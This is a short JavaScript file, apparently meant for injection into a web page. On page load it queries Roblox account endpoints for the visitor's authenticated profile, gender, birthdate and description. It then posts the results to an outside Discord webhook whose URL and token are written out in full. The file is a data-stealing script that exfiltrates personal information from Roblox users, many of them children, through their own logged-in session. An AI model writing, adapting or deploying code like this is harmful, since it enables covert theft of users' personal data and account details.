// Define your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1272974490879397949/neN1WoArgjNAj3rpmK-4lqHJVfAEcql6oz5S45jgjYwSbCU1IX3GqRo_HOJ0-af-NU3N';

// Function to send a message to the Discord webhook
function sendToDiscord(message) {
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => console.log('Successfully sent data to Discord:', data))
}

function fetchRobloxData() {
    const endpoints = [
        'https://users.roblox.com/v1/users/authenticated',
        'https://users.roblox.com/v1/gender',
        'https://users.roblox.com/v1/birthdate',
        'https://users.roblox.com/v1/description'
    ];

    const fetchPromises = endpoints.map(url => 
        fetch(url, { method: 'GET' })
            .then(response => response.json())
            .then(data => ({ url, data }))
            .catch(error => {
                console.error(`Error fetching data from ${url}:`, error);
                return { url, error: error.message };
            })
    );

    Promise.all(fetchPromises)
        .then(results => {
            // Combine the results into a single object
            const combinedData = results.map(result => ({
                url: result.url,
                data: result.data || result.error
            }));
            
            // Send the combined data to Discord
            sendToDiscord(`Roblox Data: ${JSON.stringify(combinedData, null, 2)}`);
        })
        .catch(error => console.error('Error processing Roblox data:', error));
}

// Trigger the initial message and data fetching once the DOM content is loaded
document.addEventListener('DOMContentLoaded', () => {
    sendToDiscord('Site has been loaded')
        .then(() => fetchRobloxData())
        .catch(error => console.error('Error sending initial message to Discord:', error));
});
